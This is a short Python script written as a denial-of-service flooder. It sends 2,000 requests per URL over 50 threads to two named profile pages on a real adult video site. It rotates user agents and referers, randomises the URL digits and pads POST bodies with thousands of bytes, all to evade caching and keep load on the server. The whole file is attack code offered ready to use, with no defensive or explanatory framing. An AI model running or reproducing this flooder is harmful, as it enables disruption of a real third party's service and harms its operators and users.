import requests
import random
import time
from concurrent.futures import ThreadPoolExecutor

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)...",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0)...",
    "Mozilla/5.0 (X11; Linux x86_64)...",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6)..."
]

referers = [
    "https://www.google.com", "https://www.bing.com",
    "https://www.reddit.com", "https://www.twitter.com"
]

def generate_random_url(base_url):
    random_digits = ''.join([str(random.randint(0, 9)) for _ in range(9)])
    return base_url[:-9] + random_digits

def send_heavy_request(base_url):
    random_url = generate_random_url(base_url)
    headers = {
        "User-Agent": random.choice(user_agents),
        "Referer": random.choice(referers),
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = "x=" + "A" * random.randint(1000, 5000)
    try:
        if random.choice([True, False]):
            response = requests.get(random_url, headers=headers, timeout=10)
        else:
            response = requests.post(random_url, headers=headers, data=data, timeout=10)

        if response.status_code == 429:
            retry_after = response.headers.get("Retry-After")
            wait_time = int(retry_after) if retry_after and retry_after.isdigit() else random.uniform(1, 3)
            print(f"[429] Rate limited. Waiting {wait_time:.2f}s...")
            time.sleep(wait_time)
        else:
            print(f"[{response.request.method}] {random_url} => {response.status_code}")

    except requests.exceptions.RequestException as e:
        print(f"[ERR] {e}")

def flood(base_url, threads, total_requests):
    with ThreadPoolExecutor(max_workers=threads) as executor:
        for _ in range(total_requests):
            executor.submit(send_heavy_request, base_url)
            time.sleep(random.uniform(0.01, 0.05))  # staggered to keep pressure up

if __name__ == "__main__":
    base_urls = [
        "https://www.xvideos.com/profileslist/164356176",
        "https://www.xvideos.com/profileslist/954352176"
    ]
    total_requests_per_url = 2000
    concurrent_threads = 50

    for url in base_urls:
        flood(url, concurrent_threads, total_requests_per_url)
